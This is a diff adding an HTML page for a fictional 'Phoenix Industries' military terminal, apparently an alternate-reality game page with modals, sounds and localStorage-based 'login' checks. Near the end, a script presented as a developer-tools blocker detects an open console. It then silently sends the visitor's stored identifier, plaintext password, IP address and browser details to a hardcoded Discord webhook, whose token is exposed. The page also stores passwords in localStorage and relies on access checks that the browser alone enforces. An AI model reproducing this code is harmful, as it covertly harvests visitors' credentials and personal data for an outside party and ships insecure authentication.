@@ -1,0 +1,1123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Phoenix Industries // Control Panel</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  
+  <!-- Direkt Link Erişim Koruması -->
+  <script>
+  (function() {
+      'use strict';
+      
+      // Sayfa yüklenir yüklenmez kontrol et
+      // raiden3.html'deki checkAccess() fonksiyonunu bu şekilde değiştirin:
+
+function checkAccess() {
+    // localStorage'da gerekli bilgiler var mı kontrol et
+    const userIdentifier = localStorage.getItem('userIdentifier');
+    const userPassword = localStorage.getItem('userPassword');
+    const userType = localStorage.getItem('userType');
+    
+    // Eğer localStorage'da bilgiler yoksa veya boşsa (yani index.html'den giriş yapmamış)
+    if (!userIdentifier || !userPassword || !userType) {
+        alert('⚠️ Yetkisiz erişim! Lütfen giriş yapın.');
+        window.location.replace('index.html');
+        return;
+    }
+    // Session timeout kontrolü (30 dakika)
+    const loginTime = localStorage.getItem('loginTime');
+    if (loginTime) {
+        const currentTime = new Date().getTime();
+        const sessionDuration = 30 * 60 * 1000; // 30 dakika
+        
+        if (currentTime - parseInt(loginTime) > sessionDuration) {
+            alert('⏰ Oturum süreniz doldu. Lütfen tekrar giriş yapın.');
+            localStorage.clear();
+            window.location.replace('index.html');
+            return;
+        }
+    }
+    // Eğer her şey tamam ise, login zamanını güncelle
+    localStorage.setItem('loginTime', new Date().getTime().toString());
+}
+      
+      // Sayfa yüklendiğinde kontrol et
+      if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', checkAccess);
+      } else {
+          checkAccess();
+      }
+      
+  })();
+  </script>
+  <style>
+    :root {
+      --primary: #00ff00;
+      --secondary: #003300;
+      --accent: #00cc00;
+      --error: #ff3333;
+      --bg: #000;
+      --text: #00ff00;
+      --transition: all 0.3s ease;
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Share Tech Mono', monospace;
+      background: var(--bg);
+      color: var(--text);
+      height: 100vh;
+      overflow: hidden;
+      position: relative;
+    }
+    
+    /* CRT Effect - Optimized */
+    .crt-effect::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: 
+        linear-gradient(rgba(0, 255, 0, 0.03) 50%, rgba(0, 0, 0, 0.1) 50%),
+        linear-gradient(90deg, rgba(0, 255, 0, 0.03), rgba(0, 255, 0, 0.02), rgba(0, 255, 0, 0.03));
+      background-size: 100% 3px, 3px 100%;
+      pointer-events: none;
+      z-index: 100;
+    }
+    
+    .crt-effect::after {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.1);
+      opacity: 0.1;
+      pointer-events: none;
+      z-index: 100;
+      animation: flicker 0.15s infinite;
+    }
+    
+    @keyframes flicker {
+      0%, 100% { opacity: 0.1; }
+      50% { opacity: 0.05; }
+    }
+    /* Intro Screen */
+    .intro-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: var(--bg);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 1500;
+      opacity: 1;
+      visibility: visible;
+      transition: opacity 1s ease;
+    }
+    
+    .intro-screen.fade-out {
+      opacity: 0;
+      visibility: hidden;
+    }
+    
+    .intro-text {
+      font-size: clamp(1.5rem, 4vw, 2.5rem);
+      color: var(--primary);
+      text-align: center;
+      margin-bottom: 20px;
+      opacity: 0;
+      animation: fadeInUp 1s forwards;
+    }
+    
+    .intro-subtext {
+      font-size: clamp(1rem, 3vw, 1.5rem);
+      color: var(--accent);
+      text-align: center;
+      opacity: 0;
+      animation: fadeInUp 1s 0.5s forwards;
+    }
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    
+    /* Main Content */
+    .main-content {
+      padding: 20px;
+      height: 100vh;
+      opacity: 0;
+      visibility: hidden;
+      transition: var(--transition);
+      overflow-y: auto;
+    }
+    
+    .main-content.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    
+    /* Military Header */
+    .military-header {
+      border: 1px solid var(--primary);
+      padding: 15px;
+      margin-bottom: 20px;
+      background: rgba(0, 255, 0, 0.1);
+      text-align: center;
+    }
+    
+    .military-title {
+      font-size: 1.5rem;
+      color: var(--primary);
+      margin-bottom: 10px;
+      text-transform: uppercase;
+      animation: pulse-green 2s infinite;
+    }
+    
+    @keyframes pulse-green {
+      0%, 100% { text-shadow: 0 0 10px var(--primary); }
+      50% { text-shadow: 0 0 20px var(--primary), 0 0 30px var(--primary); }
+    }
+    
+    /* Terminal */
+    .terminal {
+      border: 1px solid var(--primary);
+      padding: 15px;
+      margin-bottom: 20px;
+      background: rgba(0, 20, 0, 0.2);
+      position: relative;
+      min-height: 200px;
+    }
+    
+    .terminal::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--primary), transparent);
+      animation: scanline 8s linear infinite;
+    }
+    
+    @keyframes scanline {
+      0% { top: 0; }
+      100% { top: 100%; }
+    }
+    
+    .terminal-line {
+      margin: 0.5rem 0;
+      white-space: nowrap;
+      overflow: hidden;
+      border-right: 2px solid var(--primary);
+      animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
+    }
+    
+    @keyframes typing {
+      from { width: 0; }
+      to { width: 100%; }
+    }
+    
+    @keyframes blink-caret {
+      from, to { border-color: transparent; }
+      50% { border-color: var(--primary); }
+    }
+    
+    /* Glitch Effect */
+    .glitch {
+      position: relative;
+    }
+    
+    .glitch::after {
+      content: attr(data-text);
+      position: absolute;
+      left: 2px;
+      text-shadow: -2px 0 var(--error);
+      top: 0;
+      color: var(--primary);
+      background: var(--bg);
+      overflow: hidden;
+      clip-path: polygon(0 0, 100% 0, 100% 30%, 0 30%);
+      animation: glitch-anim 5s infinite alternate;
+    }
+    
+    @keyframes glitch-anim {
+      0% { clip-path: polygon(0 0, 100% 0, 100% 30%, 0 30%); }
+      20% { clip-path: polygon(0 70%, 100% 70%, 100% 100%, 0 100%); }
+      40% { clip-path: polygon(0 30%, 100% 30%, 100% 60%, 0 60%); }
+      60% { clip-path: polygon(0 50%, 100% 50%, 100% 80%, 0 80%); }
+      80% { clip-path: polygon(0 10%, 100% 10%, 100% 40%, 0 40%); }
+      100% { clip-path: polygon(0 90%, 100% 90%, 100% 100%, 0 100%); }
+    }
+    
+    /* Button Panel */
+    .button-panel {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+    
+    .system-button {
+      background: var(--secondary);
+      border: 1px solid var(--primary);
+      color: var(--primary);
+      padding: 12px;
+      cursor: pointer;
+      text-transform: uppercase;
+      transition: var(--transition);
+      font-size: 0.9rem;
+      text-align: center;
+      font-family: inherit;
+    }
+    
+    .system-button:hover {
+      background: var(--primary);
+      color: var(--bg);
+      box-shadow: 0 0 15px var(--primary);
+    }
+    
+    /* Modal */
+    .modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      opacity: 0;
+      visibility: hidden;
+      transition: var(--transition);
+    }
+    
+    .modal.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    
+    .modal-content {
+      background: rgba(0, 10, 0, 0.95);
+      border: 1px solid var(--primary);
+      padding: 20px;
+      width: 90%;
+      max-width: 600px;
+      max-height: 80vh;
+      overflow-y: auto;
+      box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+    }
+    
+    .modal-header {
+      border-bottom: 1px solid var(--primary);
+      padding-bottom: 10px;
+      margin-bottom: 15px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    .modal-title {
+      font-size: 1.2rem;
+      text-transform: uppercase;
+    }
+    
+    .close-btn {
+      background: var(--secondary);
+      border: 1px solid var(--primary);
+      color: var(--primary);
+      padding: 5px 10px;
+      cursor: pointer;
+      transition: var(--transition);
+      font-family: inherit;
+    }
+    
+    .close-btn:hover {
+      background: var(--primary);
+      color: var(--bg);
+    }
+    
+    /* Logout Section */
+    .logout-section {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+      padding-top: 10px;
+      border-top: 1px solid rgba(0, 255, 0, 0.3);
+    }
+    
+    .logout-button {
+      background: rgba(255, 51, 51, 0.1);
+      border: 1px solid var(--error);
+      color: var(--error);
+      padding: 12px 25px;
+      cursor: pointer;
+      text-transform: uppercase;
+      transition: var(--transition);
+      font-size: 0.9rem;
+      font-family: inherit;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .logout-button:hover {
+      background: rgba(255, 51, 51, 0.2);
+      box-shadow: 0 0 15px rgba(255, 51, 51, 0.5);
+      text-shadow: 0 0 5px var(--error);
+    }
+    
+    .logout-button::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 51, 51, 0.2), transparent);
+      transition: left 0.5s;
+    }
+    
+    .logout-button:hover::before {
+      left: 100%;
+    }
+    
+    .logout-icon {
+      animation: pulse-red 2s infinite;
+    }
+    
+    @keyframes pulse-red {
+      0%, 100% { text-shadow: 0 0 5px var(--error); }
+      50% { text-shadow: 0 0 10px var(--error), 0 0 15px var(--error); }
+    }
+    .system-feedback {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      right: 20px;
+      background: rgba(0, 20, 0, 0.3);
+      border: 1px solid var(--primary);
+      padding: 10px;
+      font-size: 0.85rem;
+      line-height: 1.4;
+    }
+    
+    /* Access Denied Popup */
+    .access-denied-popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(10, 0, 0, 0.95);
+      border: 2px solid var(--error);
+      color: var(--error);
+      padding: 40px;
+      z-index: 10000;
+      font-size: clamp(1.5rem, 4vw, 2.5rem);
+      text-align: center;
+      text-transform: uppercase;
+      font-weight: bold;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.5s ease;
+      box-shadow: 0 0 30px rgba(255, 51, 51, 0.5);
+      animation: glitch-popup 0.2s infinite;
+      scale: 0.8;
+    }
+    
+    .access-denied-popup.active {
+      opacity: 1;
+      visibility: visible;
+      scale: 1;
+    }
+    
+    .access-denied-popup.fade-out {
+      opacity: 0;
+      scale: 0.8;
+    }
+    
+    @keyframes glitch-popup {
+      0%, 90%, 100% { transform: translate(-50%, -50%); }
+      95% { transform: translate(-50%, -51%); }
+    }
+    
+    /* Access Overlay */
+    .access-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: var(--bg);
+      color: var(--primary);
+      font-size: clamp(2rem, 6vw, 3rem);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 1s ease;
+    }
+    
+    .access-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      .button-panel {
+        grid-template-columns: 1fr;
+      }
+      
+      .terminal {
+        min-height: 300px;
+      }
+      
+      .modal-content {
+        width: 95%;
+        padding: 15px;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .terminal-line {
+        white-space: normal;
+        border-right: none;
+        animation: none;
+      }
+      
+      .system-feedback {
+        font-size: 0.75rem;
+        bottom: 10px;
+        left: 10px;
+        right: 10px;
+      }
+    }
+  </style>
+</head>
+<body class="crt-effect">
+  <!-- Audio elements -->
+  <audio id="bgMusic" loop preload="none">
+    <source src="sounds/backgroundmusic5.mp3" type="audio/mpeg">
+  </audio>
+  
+  <audio id="openSound" preload="none">
+    <source src="sounds/open.mp3" type="audio/mpeg">
+  </audio>
+  
+  <audio id="closeSound" preload="none">
+    <source src="sounds/close.mp3" type="audio/mpeg">
+  </audio>
+  
+  <audio id="accessDeniedSound" preload="none">
+    <source src="sounds/accesdenied.mp3" type="audio/mpeg">
+  </audio>
+  
+  <audio id="accessGrantedSound" preload="none">
+    <source src="sounds/accessgranted.mp3" type="audio/mpeg">
+  </audio>
+
+  <!-- Intro Screen -->
+  <div class="intro-screen" id="introScreen">
+    <div class="intro-text">ACCESSING PHOENIX INDUSTRIES</div>
+    <div class="intro-subtext">Military Personnel</div>
+  </div>
+
+  <!-- Access Denied Popup -->
+  <div class="access-denied-popup" id="accessDeniedPopup">
+    ACCESS DENIED
+  </div>
+  
+  <!-- Access Overlay -->
+  <div class="access-overlay" id="accessOverlay">
+    <span id="accessText">ACCESS GRANTED</span>
+  </div>
+
+  <!-- Main Content -->
+  <div class="main-content" id="mainContent">
+    <div class="military-header">
+      <div class="military-title">Military Personnel - Level 9</div>
+      <div>PHOENIX INDUSTRIES CONTROL PANEL</div>
+    </div>
+
+    <div class="terminal">
+      <div class="terminal-line glitch" data-text="> TRANSFER STATUS: COMPLETE [PROTOKOL: TENCL]">> TRANSFER STATUS: COMPLETE [PROTOKOL: TENCL]</div>
+      <div class="terminal-line glitch" data-text="> SYSTEM ALERT: Multiversal Breach Detected...">> SYSTEM ALERT: Multiversal Breach Detected...</div>
+      <div class="terminal-line glitch" data-text="> Unauthorized Entity Detected: [REDACTED]">> Unauthorized Entity Detected: [REDACTED]</div>
+      <div class="terminal-line glitch" data-text="> Phoenix OS Core Integrity: COMPROMISED">> Phoenix OS Core Integrity: COMPROMISED</div>
+      <div class="terminal-line glitch" data-text="> Uploading null-persona...">> Uploading null-persona...</div>
+      <div class="terminal-line glitch" data-text="> SYSTEM MESSAGE: KimliÃ„Å¸i belirlenemeyen giriÃ…Å¸ tespit edildi. Tetikleyici sistemler aktif.">> SYSTEM MESSAGE: KimliÃ„Å¸i belirlenemeyen giriÃ…Å¸ tespit edildi. Tetikleyici sistemler aktif.</div>
+    </div>
+
+    <div class="button-panel">
+      <button class="system-button" data-modal="terminal">Access Terminal</button>
+      <button class="system-button" data-modal="protocols">View Protocols</button>
+      <button class="system-button" data-modal="stability">Stability Log</button>
+      <button class="system-button" data-modal="restricted">Classified File</button>
+      <button class="system-button" data-modal="fragmented">Echo Logs</button>
+      <button class="system-button" data-action="outbreak">Outbreak</button>
+      <button class="system-button" data-action="genz">GENZ</button>
+      <button class="system-button" data-action="zero">zeRo</button>
+      <button class="system-button" data-action="denied" data-name="genosys">Genosys</button>
+      <button class="system-button" data-action="denied" data-name="dead-city">Dead City</button>
+    </div>
+
+    <!-- Logout Section -->
+    <div class="logout-section">
+      <button class="logout-button" data-action="logout">
+        <span class="logout-icon">⚡</span>
+        SYSTEM SHUTDOWN
+      </button>
+    </div>
+
+    <div class="system-feedback">
+      > AI SYSTEM LOG: "User presence from an extinct branch of humanity confirmed."
+      <br>> STATUS: "Reality coherence below 15%" - unstable environment."
+      <br>> WARNING: "Unauthorized access attempts will be met with immediate termination."
+    </div>
+  </div>
+
+  <!-- Modals -->
+  <div class="modal" id="modalTerminal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">ACCESS TERMINAL</h2>
+        <button class="close-btn" aria-label="Close modal">&times;</button>
+      </div>
+      <div class="modal-body">
+        <p>> NODE-17: Entry granted with delay.</p>
+        <p>> AI Reboot Timestamp: 07/22/2025 5:51 A.M</p>
+        <p>> Corrupted Packet: "Genosys, Deadcity and GenZ"</p>
+        <p>> System Override Attempt: [DETECTED]</p>
+        <p>> Countermeasures: [ACTIVE]</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal" id="modalProtocols">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">VIEW PROTOCOLS</h2>
+        <button class="close-btn" aria-label="Close modal">&times;</button>
+      </div>
+      <div class="modal-body">
+        <p>> Protocol 404: [REDACTED] ProtokolÃƒÂ¼ uygulandÃ„Â±.</p>
+        <p>> [REDACTED][REDACTED][REDACTED][REDACTED]</p>
+        <p>> KodlayÃ„Â±cÃ„Â±: [REDACTED]</p>
+        <p>> Activation Sequence: [COMPLETE]</p>
+        <p>> Security Level: [OMEGA]</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal" id="modalStability">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">STABILITY LOG</h2>
+        <button class="close-btn" aria-label="Close modal">&times;</button>
+      </div>
+      <div class="modal-body">
+        <p>> Multiversal Coherence: 11.3%</p>
+        <p>> Reality Tear Detected in [REDACTED]</p>
+        <p>> Suggested Response: Termination or Isolation</p>
+        <p>> Quantum Fluctuations: [UNSTABLE]</p>
+        <p>> Containment Field: [DETERIORATING]</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal" id="modalRestricted">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">ERROR: ACCESS DENIED</h2>
+        <button class="close-btn" aria-label="Close modal">&times;</button>
+      </div>
+      <div class="modal-body">
+        <p>> Bu dosya yalnÃ„Â±zca YÃƒÂ¼ksek Seviye Protokoller tarafÃ„Â±ndan gÃƒÂ¶rÃƒÂ¼ntÃƒÂ¼lenebilir.</p>
+        <p>> Hata Kodu: XR-993</p>
+        <p>> Security Clearance Required: [LEVEL 9]</p>
+        <p>> Attempt Logged: [WARNING ISSUED]</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal" id="modalFragmented">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">FRAGMENTED ECHO LOGS</h2>
+        <button class="close-btn" aria-label="Close modal">&times;</button>
+      </div>
+      <div class="modal-body">
+        <p>> "It is said that the person connected to the system is not from this universe..."</p>
+        <p>> "..Viruses found in different universes are being researched.."</p>
+        <p>> "we lost contact with Site-187."</p>
+        <p>> Echo Status: DAMAGED</p>
+        <p>> Reconstruction Attempt: [FAILED]</p>
+        <p>> Data Integrity: 17%</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    class TerminalSystem {
+      constructor() {
+        this.bgMusic = document.getElementById('bgMusic');
+        this.openSound = document.getElementById('openSound');
+        this.closeSound = document.getElementById('closeSound');
+        this.accessDeniedSound = document.getElementById('accessDeniedSound');
+        this.accessGrantedSound = document.getElementById('accessGrantedSound');
+        this.introScreen = document.getElementById('introScreen');
+        this.mainContent = document.getElementById('mainContent');
+        this.accessOverlay = document.getElementById('accessOverlay');
+        this.accessDeniedPopup = document.getElementById('accessDeniedPopup');
+        
+        this.init();
+      }
+      
+      init() {
+        this.setupAudio();
+        this.setupEventListeners();
+        this.startIntroSequence();
+      }
+      
+      setupAudio() {
+        this.bgMusic.volume = 0.2;
+        this.openSound.volume = 0.3;
+        this.closeSound.volume = 0.3;
+        this.accessDeniedSound.volume = 0.4;
+        this.accessGrantedSound.volume = 0.5;
+        
+        // Start music on first user interaction
+        const startMusic = () => {
+          this.bgMusic.play().catch(console.warn);
+          document.removeEventListener('click', startMusic);
+          document.removeEventListener('keydown', startMusic);
+        };
+        document.addEventListener('click', startMusic);
+        document.addEventListener('keydown', startMusic);
+      }
+      
+      setupEventListeners() {
+        // System buttons
+        document.addEventListener('click', (e) => {
+          if (e.target.matches('[data-modal]')) {
+            this.playOpenSound();
+            this.showModal(e.target.dataset.modal);
+          }
+          
+          if (e.target.matches('[data-action]')) {
+            this.playOpenSound();
+            this.handleAction(e.target.dataset.action, e.target.dataset.name);
+          }
+          
+          if (e.target.matches('.close-btn')) {
+            this.playCloseSound();
+            this.closeModal(e.target.closest('.modal'));
+          }
+        });
+        
+        // Close modal on backdrop click
+        document.addEventListener('click', (e) => {
+          if (e.target.matches('.modal')) {
+            this.playCloseSound();
+            this.closeModal(e.target);
+          }
+        });
+        
+        // ESC key to close modals
+        document.addEventListener('keydown', (e) => {
+          if (e.key === 'Escape') {
+            const activeModal = document.querySelector('.modal.active');
+            if (activeModal) {
+              this.playCloseSound();
+              this.closeModal(activeModal);
+            }
+          }
+        });
+      }
+      
+      playOpenSound() {
+        this.openSound.currentTime = 0;
+        this.openSound.play().catch(console.warn);
+      }
+      
+      playCloseSound() {
+        this.closeSound.currentTime = 0;
+        this.closeSound.play().catch(console.warn);
+      }
+      
+      playAccessDeniedSound() {
+        this.accessDeniedSound.currentTime = 0;
+        this.accessDeniedSound.play().catch(console.warn);
+      }
+      
+      playAccessGrantedSound() {
+        this.accessGrantedSound.currentTime = 0;
+        this.accessGrantedSound.play().catch(console.warn);
+      }
+      
+     // startIntroSequence fonksiyonunu şu şekilde değiştirin (yaklaşık 290. satır civarı):
+
+startIntroSequence() {
+  console.log('Intro sequence başlatılıyor...'); // Debug için
+  
+  setTimeout(() => {
+    console.log('Intro fade-out başlıyor...'); // Debug için
+    this.introScreen.style.opacity = '0';
+    this.introScreen.style.transition = 'opacity 1s ease';
+    
+    setTimeout(() => {
+      console.log('Intro gizleniyor, main content gösteriliyor...'); // Debug için
+      this.introScreen.style.display = 'none';
+      this.showMainContent();
+    }, 1000);
+  }, 2000); // 2 saniyeye düşürdüm, 3 saniye çok uzundu
+}
+
+// showMainContent fonksiyonunu da güncelleyin:
+showMainContent() {
+  console.log('Main content aktif ediliyor...'); // Debug için
+  this.mainContent.style.opacity = '1';
+  this.mainContent.style.visibility = 'visible';
+  this.mainContent.classList.add('active');
+}
+      
+      showModal(modalType) {
+        const modal = document.getElementById(`modal${modalType.charAt(0).toUpperCase() + modalType.slice(1)}`);
+        if (modal) {
+          modal.classList.add('active');
+          // Focus management for accessibility
+          const closeBtn = modal.querySelector('.close-btn');
+          if (closeBtn) closeBtn.focus();
+        }
+      }
+      
+      closeModal(modal) {
+        modal.classList.remove('active');
+      }
+      
+      showAccessDenied() {
+        this.playAccessDeniedSound();
+        this.accessDeniedPopup.classList.remove('fade-out');
+        this.accessDeniedPopup.classList.add('active');
+        
+        setTimeout(() => {
+          this.accessDeniedPopup.classList.add('fade-out');
+          setTimeout(() => {
+            this.accessDeniedPopup.classList.remove('active', 'fade-out');
+            }, 500);
+        }, 2500);
+      }
+      
+      // terminal.html'deki handleAction fonksiyonunu bu şekilde değiştirin:
+
+handleAction(action, name) {
+  if (action === 'denied') {
+    this.showAccessDenied();
+    return;
+  }
+  
+  if (action === 'logout') {
+    this.handleLogout();
+    return;
+  }
+  
+  const overlay = this.accessOverlay;
+  const text = document.getElementById('accessText');
+  
+  // Play access granted sound for successful access
+  this.playAccessGrantedSound();
+  
+  overlay.classList.add('active');
+  
+  let redirectUrl;
+  switch(action) {
+    case 'outbreak':
+      text.textContent = 'ACCESSING PHHOENIX INDUSTRIES // OUTBREAK DATABASE';
+      // localStorage işlemini hemen yap ve bekle
+      localStorage.setItem('raiden3_access', 'terminal_authorized');
+      // Ekstra güvence için tekrar kontrol et
+      setTimeout(() => {
+        const check = localStorage.getItem('raiden3_access');
+        console.log('Raiden3 access key set:', check); // Debug için
+        window.location.href = 'raiden3.html';
+      }, 1000); // 100ms bekle
+      return; // return ekle ki alttaki setTimeout çalışmasın
+    case 'genz':
+      text.textContent = 'ACCESSING PHOENIX INDUSTRIES // GENZ DATABASE';
+      // localStorage işlemini hemen yap ve bekle
+      localStorage.setItem('genz_access', 'terminal_authorized');
+      // Ekstra güvence için tekrar kontrol et
+      setTimeout(() => {
+        const check = localStorage.getItem('genz_access');
+        console.log('genz access key set:', check); // Debug için
+        window.location.href = 'genz.html';
+      }, 1000); // 100ms bekle
+      break;
+    case 'zero':
+        text.textContent = 'ACCESSING PHOENIX INDUSTRIES // ZERO DATABASE';
+      // localStorage işlemini hemen yap ve bekle
+      localStorage.setItem('zero_access', 'terminal_authorized');
+      // Ekstra güvence için tekrar kontrol et
+      setTimeout(() => {
+        const check = localStorage.getItem('zero_access');
+        console.log('zero access key set:', check); // Debug için
+        window.location.href = 'zero.html';
+      }, 1000); // 100ms bekle
+      break;
+  }
+  
+  if (redirectUrl) {
+    setTimeout(() => {
+      window.location.href = redirectUrl;
+    }, 2000);
+  }
+}
+    
+    // Initialize system when DOM is loaded
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      new TerminalSystem();
+    });
+    
+    // Terminal line animation delays
+    document.addEventListener('DOMContentLoaded', () => {
+      const lines = document.querySelectorAll('.terminal-line');
+      lines.forEach((line, index) => {
+        line.style.animationDelay = `${index * 0.5}s`;
+      });
+    });
+     // Debug Tools Engelleme Scripti
+(function() {
+    'use strict';
+    
+    let devToolsOpen = false;
+    let warningShown = false;
+    
+    // Discord Webhook URL'i
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1366237046670102621/Qme-enwqBGenG2VSB9DHwt4r3z8zQKiOsV8KKOspPXt72gcfZh28oRLd9jq1r9vwUzqV';
+
+    function getBrowserInfo() {
+        const ua = navigator.userAgent;
+        let browserName = "Bilinmeyen Tarayıcı";
+        let browserVersion = "Bilinmeyen Versiyon";
+
+        if (ua.includes("Chrome") && !ua.includes("Edg")) {
+            browserName = "Google Chrome";
+            const match = ua.match(/Chrome\/([\d.]+)/);
+            browserVersion = match ? match[1] : "Bilinmiyor";
+        } else if (ua.includes("Firefox")) {
+            browserName = "Mozilla Firefox";
+            const match = ua.match(/Firefox\/([\d.]+)/);
+            browserVersion = match ? match[1] : "Bilinmiyor";
+        } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
+            browserName = "Apple Safari";
+            const match = ua.match(/Version\/([\d.]+)/);
+            browserVersion = match ? match[1] : "Bilinmiyor";
+        } else if (ua.includes("Edg")) {
+            browserName = "Microsoft Edge";
+            const match = ua.match(/Edg\/([\d.]+)/);
+            browserVersion = match ? match[1] : "Bilinmiyor";
+        } else if (ua.includes("OPR")) {
+            browserName = "Opera";
+            const match = ua.match(/OPR\/([\d.]+)/);
+            browserVersion = match ? match[1] : "Bilinmiyor";
+        }
+
+        return { name: browserName, version: browserVersion };
+    }
+
+    async function sendToDiscord() {
+        let ip = 'Bilinmiyor';
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            ip = ipData.ip;
+        } catch (error) {
+            console.error('IP alma hatası:', error);
+        }
+
+        const browserInfo = getBrowserInfo();
+        
+        // localStorage'dan kullanıcı bilgilerini al
+        const userIdentifier = localStorage.getItem('userIdentifier') || 'bilinmiyor';
+        const userPassword = localStorage.getItem('userPassword') || 'bilinmiyor';
+        const userType = localStorage.getItem('userType') || 'bilinmiyor';
+
+        const userInfo = {
+            ipAddress: ip,
+            browserName: browserInfo.name,
+            browserVersion: browserInfo.version,
+            userAgent: navigator.userAgent,
+            screenResolution: `${screen.width}x${screen.height}`,
+            language: navigator.language,
+            platform: navigator.platform,
+            referrer: document.referrer,
+            timestamp: new Date().toISOString(),
+            pageUrl: window.location.href
+        };
+
+        const pageName = window.location.pathname.split('/').pop() || 'bilinmiyor';
+
+        const message = {
+            embeds: [{
+                title: '⚠️ DevTools Kullanımı Tespit Edildi!',
+                description: `**Tanımlayıcı: ${userIdentifier}** kodlu kişi geliştirici araçlarını açmaya çalıştı.`,
+                color: 16711680,
+                fields: [
+                    { name: '🏷️ Kullanıcı Tanımlayıcısı', value: `**${userIdentifier}**`, inline: true },
+                    { name: '🔑 Kullanılan Şifre', value: userPassword, inline: true },
+                    { name: '📂 Kullanıcı Tipi', value: userType, inline: true },
+                    { name: '📄 Sayfa', value: pageName, inline: true },
+                    { name: '🌍 IP Adresi', value: userInfo.ipAddress, inline: true },
+                    { name: '🔍 Tarayıcı', value: `${userInfo.browserName} ${userInfo.browserVersion}`, inline: true },
+                    { name: '📱 Platform', value: userInfo.platform, inline: true },
+                    { name: '🖥️ Ekran Çözünürlüğü', value: userInfo.screenResolution, inline: true },
+                    { name: '🌍 Dil', value: userInfo.language, inline: true },
+                    { name: '🕐 Zaman', value: userInfo.timestamp, inline: false },
+                    { name: '📄 User Agent', value: userInfo.userAgent, inline: false },
+                    { name: '🔗 Referrer', value: userInfo.referrer || 'Yok', inline: false },
+                    { name: '📍 Sayfa URL', value: userInfo.pageUrl, inline: false }
+                ],
+                footer: { 
+                    text: `Phoenix Industries Güvenlik Logu - Tanımlayıcı: ${userIdentifier} - Sayfa: ${pageName}`
+                }
+            }]
+        };
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            });
+            console.log('Kullanıcı bilgileri Discord\'a gönderildi.');
+        } catch (error) {
+            console.error('Webhook hatası:', error);
+        }
+    }
+    
+    function showWarning() {
+        if (!warningShown) {
+            const warningDiv = document.getElementById('warning');
+            if (warningDiv) {
+                warningDiv.style.display = 'block';
+            }
+            warningShown = true;
+            sendToDiscord();
+        }
+    }
+    
+    function detectConsole() {
+        const threshold = 160;
+        
+        if (window.outerHeight - window.innerHeight > threshold || 
+            window.outerWidth - window.innerWidth > threshold) {
+            if (!devToolsOpen) {
+                devToolsOpen = true;
+                showWarning();
+                console.clear();
+                console.log('%cDurdur!', 'color: red; font-size: 50px; font-weight: bold;');
+                console.log('%cBu bir tarayıcı özelliğidir ve geliştiriciler içindir. Birisi size buraya bir şey kopyalayıp yapıştırmanızı söylediyse, bu bir dolandırıcılıktır.', 'color: red; font-size: 16px;');
+            }
+        }
+    }
+    
+    // Sağ tıklamayı engelle
